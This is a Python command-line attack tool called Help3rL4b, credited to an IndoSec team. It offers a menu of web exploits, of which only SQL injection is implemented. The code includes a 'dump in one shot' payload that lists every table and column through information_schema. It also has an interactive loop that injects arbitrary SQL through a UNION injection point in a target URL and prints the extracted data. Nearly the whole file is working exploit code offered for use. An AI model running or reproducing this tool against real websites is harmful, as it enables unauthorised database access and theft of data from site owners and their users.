#!/usr/bin/python
import requests,sys,os,readline,re,binascii
from urllib.parse import unquote
from prettytable import PrettyTable
import pprint

dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "

def var_dump(var, prefix=''):
    """
    You know you're a php developer when the first thing you ask for
    when learning a new language is 'Where's var_dump?????'
    """
    my_type = '[' + var.__class__.__name__ + '(' + str(len(var)) + ')]:'
    print(prefix, my_type, sep='')
    prefix += '    '
    for i in var:
        if type(i) in (list, tuple, dict, set):
            var_dump(i, prefix)
        else:
            if isinstance(var, dict):
                print(prefix, i, ': (', var[i].__class__.__name__, ') ', var[i], sep='')
            else:
                print(prefix, '(', i.__class__.__name__, ') ', i, sep='')

def banner():
    print("""


   /yy+.`       `.+sy/     _  _  ____  __    ____  ____  ____  __     ___  ____
     `:sy/`   `+ys:`      / )( \(  __)(  )  (  _ \( __ \(  _ \(  )   / _ \(  _ \`
   .``  `od:::do`  ``.    ) __ ( ) _) / (_/\ ) __/ (__ ( )   // (_/\(__  ( ) _ (
   /ys.  /NMMMN/  .sy/    \_)(_/(____)\____/(__)  (____/(__\_)\____/  (__/(____/
    `do--ossyyyo--od`     ------------------------------------------------------
    `oyNNNNNdNNNNNy+`     Author : Fauzanw ft Rizsyad AR
```/yoyMMMMM`MMMMMyoy/``` Team   : { IndoSec }
+sys-:sMMMMM`MMMMMs::sys+ Help3rL4b is your helper lab to exploit security holes
 `.`do/MMMMM`MMMMM/od`.`  We not responsible for damage caused by Help3rL4b,
    m:.NMMMM`MMMMN.:m    
 `/yy. :mMMM`MMMm: .yy/` 
.y/``   `:os`so:`   ``/y.
    """)

def menu():
    print("""
[\033[91m+\033[97m] Options :
└[\033[92m•\033[97m] \033[91m1. \033[97mSQL Injection 
└[\033[92m•\033[97m] \033[91m2. \033[97mRemote File Inclusion
└[\033[92m•\033[97m] \033[91m3. \033[97mLocal File Inclusion
└[\033[92m•\033[97m] \033[91m4. \033[97mRemote Command Execution
""")

def execute_sqli(url):
    r    = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,user(),0x7b20496e646f536563207d)"))
    user = r.text.split('{ IndoSec }')[1]
    try:
        cmd = input("\033[96m┌["+ user +"]\n\033[96m└\033[93m#\033[97m ")
        if cmd == "user":
            option = "user()"
        elif cmd == "dios":
            option = dios
        else:
            option = cmd
        r      = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,"+ option +",0x7b20496e646f536563207d)"))
        output = r.text.split("{ IndoSec }")[1]
        if re.search("<li>", output):
            li = output.split("<li>")
            for result in li:
                print(result)
            execute_sqli(url)
        elif re.search("<br>", output):
            br = output.split("<br>")
            x = PrettyTable()
            x.field_names = ["Table", "Column"]
            for result in br:
                # x.add_row([result.split(" :: ")[0], result.split(" :: ")[1]])
                print(result)
            # x.sorby = "Table"
            execute_sqli(url)
        print("\n[+] Output :",output, "\n")
        execute_sqli(url)
    except Exception:
        print("\n[!] Syntax Error\n")
        execute_sqli(url)

def sqli():
    print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,inject,5-- -")
    url = input("[?] URL : ")
    if re.search("http", url):
        url = url
    elif re.search('\%68\%74\%74\%70', url):
        url = unquote(url)
    else:
        url = "http://"+url
    execute_sqli(url)

banner()
menu()
action = input("\n[\033[93m?\033[97m] Options : ")
if action == "1":
    sqli()